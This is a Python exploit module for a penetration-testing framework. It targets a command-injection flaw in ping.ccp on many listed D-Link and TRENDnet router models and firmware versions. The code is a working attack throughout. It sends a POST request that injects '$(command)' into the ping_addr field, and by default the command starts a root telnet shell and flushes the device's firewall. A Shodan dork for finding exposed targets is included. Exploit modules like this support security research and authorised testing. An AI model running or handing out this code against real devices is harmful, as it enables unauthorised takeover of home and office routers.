# Name:D-link DIR-636L and others remote code execution in ping.ccp
# File:dir636l_exec.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 25.12.2016
# Last modified: 25.12.2016
# Shodan Dork: mini_httpd/1.19 19dec2003 port:"8181"
# Description: Command execution vulnerability for multiple D-link and TRENDnet models listed below:
# D-Link DIR-626L (Rev A) - v1.04b04
# D-Link DIR-636L (Rev A) - v1.04
# D-Link DIR-636L (Rev A) - v1.05 up to v1.05B09_BETA
# D-Link DIR-808L (Rev A) - v1.03b05
# D-Link DIR-810L (Rev A) - v1.01b04
# D-Link DIR-810L (Rev B) - v2.02b01
# D-Link DIR-820L (Rev A) - v1.02B10
# D-Link DIR-820L (Rev A) - v1.05B03
# D-Link DIR-820L (Rev B) - v2.01b02
# D-Link DIR-826L (Rev A) - v1.00b23
# D-Link DIR-830L (Rev A) - v1.00b07
# D-Link DIR-836L (Rev A) - v1.01b03
# TRENDnet TEW-731BR (Rev 2) - v2.01b01
# Additional platforms believed to be affected:
# D-Link DIR-651 (Rev A) - v1.10NAb02 - found by [Stefan Viehböck](https://twitter.com/sviehb)
# TRENDnet TEW-651BR (v2.XR) - vUNKNOWN - found by [Stefan Viehböck](https://twitter.com/sviehb)
# TRENDnet TEW-652BRP (v3.XR) - vUNKNOWN - found by [Stefan Viehböck](https://twitter.com/sviehb)
# TRENDnet TEW-711BR (Rev 1) - v1.00b31 - found by [@dyngnosis](https://twitter.com/dyngnosis)
# TRENDnet TEW-810DR (Rev 1) - v1.00b19 - found by [@dyngnosis](https://twitter.com/dyngnosis)
# TRENDnet TEW-813DRU (Rev 1) - v1.00b23 - found by [@dyngnosis](https://twitter.com/dyngnosis)
# Based on: https://github.com/darkarnium/secpub/tree/master/Multivendor/ncc2

import core.Exploit
import core.io

import requests
import interface.utils
from interface.messages import print_error, print_success, print_help, print_info, print_warning


class Exploit(core.Exploit.RextExploit):
    """
Name:D-link DIR-636L and others remote code execution in ping.ccp
File:dir636l_exec.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 25.12.2016
Shodan Dork: mini_httpd/1.19 19dec2003 port:"8181"
Description: Command execution vulnerability for multiple D-link and TRENDnet models listed below:
D-Link DIR-626L (Rev A) - v1.04b04
D-Link DIR-636L (Rev A) - v1.04
D-Link DIR-636L (Rev A) - v1.05 up to v1.05B09_BETA
D-Link DIR-808L (Rev A) - v1.03b05
D-Link DIR-810L (Rev A) - v1.01b04
D-Link DIR-810L (Rev B) - v2.02b01
D-Link DIR-820L (Rev A) - v1.02B10
D-Link DIR-820L (Rev A) - v1.05B03
D-Link DIR-820L (Rev B) - v2.01b02
D-Link DIR-826L (Rev A) - v1.00b23
D-Link DIR-830L (Rev A) - v1.00b07
D-Link DIR-836L (Rev A) - v1.01b03
TRENDnet TEW-731BR (Rev 2) - v2.01b01
Additional platforms believed to be affected:
D-Link DIR-651 (Rev A) - v1.10NAb02 - found by [Stefan Viehböck](https://twitter.com/sviehb)
TRENDnet TEW-651BR (v2.XR) - vUNKNOWN - found by [Stefan Viehböck](https://twitter.com/sviehb)
TRENDnet TEW-652BRP (v3.XR) - vUNKNOWN - found by [Stefan Viehböck](https://twitter.com/sviehb)
TRENDnet TEW-711BR (Rev 1) - v1.00b31 - found by [@dyngnosis](https://twitter.com/dyngnosis)
TRENDnet TEW-810DR (Rev 1) - v1.00b19 - found by [@dyngnosis](https://twitter.com/dyngnosis)
TRENDnet TEW-813DRU (Rev 1) - v1.00b23 - found by [@dyngnosis](https://twitter.com/dyngnosis)
Based on: https://github.com/darkarnium/secpub/tree/master/Multivendor/ncc2
Note: Works on any port were http server is running, 8181 will work too
      Running: telnetd -l /bin/sh
               iptables -P INPUT ACCEPT
               iptables -F INPUT
      will spawn root shell on telnet

Options:
    Name        Description

    host        Target host address
    port        Target port
    command     Command to execute e.g. cat var/passwd
    ssl         Yes/No value if request should be sent using SSL
    """
    command = ""
    ssl = False

    def __init__(self):
        self.command = "telnetd -l /bin/sh;iptables -P INPUT ACCEPT;iptables -F INPUT"
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "command":
                self.command = ' '.join(args[1:])
            elif args[0] == "ssl":
                if str(args[1]).lower() == "yes":
                    self.ssl = True
                elif str(args[1]).lower() == "no":
                    self.ssl = False
                else:
                    print_error("please use yes/no as parameter")
        except IndexError:
            print_error("please specify value for variable")

    def do_command(self, e):
        print_info(self.command)

    def help_command(self):
        print_help("Prints current value of command")

    def do_run(self, e):
        if self.ssl:
            prefix = "https://"
        else:
            prefix = "http://"
        url = "%s%s:%s/ping.ccp" % (prefix, self.host, self.port)

        payload = {'ccp_act': 'ping_v6',
                   'ping_addr': '$(%s)' % self.command}
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'Accept-Language: en-us,en;q=0.5',
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'
                   }
        try:
            print_warning("Sending exploit")
            response = requests.post(url, headers=headers, data=payload, timeout=60)
            if response.status_code == 200:
                print_success("output not available but received status code 200")
            else:
                print_error("recieved status:", response.status_code)
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("exploit failed")
Exploit()
